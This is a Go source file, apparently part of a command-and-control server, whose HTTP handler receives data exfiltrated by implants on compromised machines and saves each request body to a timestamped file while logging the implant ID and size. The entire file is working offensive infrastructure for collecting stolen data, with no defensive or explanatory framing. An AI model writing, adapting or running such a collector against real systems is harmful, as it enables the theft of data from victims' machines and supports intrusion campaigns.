package main

/*
 * exfil.go
 * Save exfil request bodies to files
 * By J. Stuart McMurray
 * Created 20230523
 * Last Modified 20230523
 */

import (
	"errors"
	"io"
	"io/fs"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

// ExfilLog is used to marshal command output to unambiguous JSON.
type ExfilLog struct {
	ID       string
	Empty    bool   `json:",omitempty"`
	Filename string `json:",omitempty"`
	Size     int64  `json:",omitempty"`
	Err      string `json:",omitempty"`
}

// HandleExfil handles exfil from an implant
func HandleExfil(w http.ResponseWriter, r *http.Request) {
	l := ExfilLog{ID: ImplantID(r)}

	/* We'll always log the requests. */
	defer func() {
		RLogJSON(r, MessageTypeExfil, l)
	}()

	/* Make sure we have at least one byte of exfil. */
	firstByte := make([]byte, 1)
	for {
		/* Grab the first byte of the body. */
		n, err := r.Body.Read(firstByte)
		if errors.Is(err, io.EOF) { /* Empty body */
			l.Empty = true
			return
		} else if nil != err {
			l.Err = "reading first byte: " + err.Error()
			return
		}
		/* Theoretically, we could get (0, nil).  */
		if 0 != n {
			break
		}
	}

	/* File for the exfil.  We may need to try a few names to get one
	not in use. */
	var f *os.File
	for {
		var err error
		/* Filename is just the current date and time with nanosecond
		precision.  Should be unique. */
		l.Filename = time.Now().Format(time.RFC3339Nano)
		fn := filepath.Join(Env.ExfilDir, l.Filename)
		f, err = os.OpenFile(fn, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0660)
		if errors.Is(err, fs.ErrExist) {
			/* Another request got this name .*/
			continue
		}
		defer f.Close()
		if nil != err {
			/* Some bigger problem. */
			l.Err = "opening file: " + err.Error()
			return
		}
		break
	}

	/* Save the exfil to the file.  It'll be truncated if it's too long;
	this is not an error. */
	wn, err := f.Write(firstByte)
	if nil != err {
		l.Err = "writing first byte: " + err.Error()
		return
	}
	l.Size += int64(wn)
	cn, err := io.Copy(f, r.Body)
	l.Size += cn /* Might have got something. */
	var mbe *http.MaxBytesError
	if errors.As(err, &mbe) { /* Expected for large files. */
		err = nil
	} else if nil != err {
		l.Err = "writing: " + err.Error()
	}
}
